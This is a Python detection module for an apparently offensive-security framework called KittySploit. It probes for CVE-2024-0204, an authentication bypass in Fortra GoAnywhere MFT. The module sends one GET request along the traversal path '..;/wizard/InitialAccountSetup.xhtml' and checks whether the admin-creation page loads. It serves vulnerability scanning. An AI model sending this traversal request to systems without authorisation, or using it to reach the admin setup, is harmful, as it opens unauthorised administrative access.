#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Authentication bypass in Fortra's GoAnywhere MFT prior to 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fortra GoAnywhere MFT - Authentication Bypass Detection',
        'description': "Authentication bypass in Fortra's GoAnywhere MFT prior to 7.4.1 allows an unauthorized user to create an admin user via the administration portal.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'packetstorm', 'cve2024', 'auth-bypass', 'goanywhere', 'fortra', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://my.goanywhere.com/webclient/ViewSecurityAdvisories.xhtml',
            'https://www.fortra.com/security/advisory/fi-2024-001',
            'https://github.com/horizon3ai/CVE-2024-0204/blob/main/CVE-2024-0204.py',
            'https://www.horizon3.ai/cve-2024-0204-fortra-goanywhere-mft-authentication-bypass-deep-dive/',
            'http://packetstormsecurity.com/files/176683/GoAnywhere-MFT-Authentication-Bypass.html',
        ],
        'cve': 'CVE-2024-0204',
    }

    def run(self):
        r = self.http_request(method="GET", path='/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Create an administrator account', 'goanywhere',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Fortra GoAnywhere MFT - Authentication Bypass detected",
                path='/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml',
            )
            return True
        return False

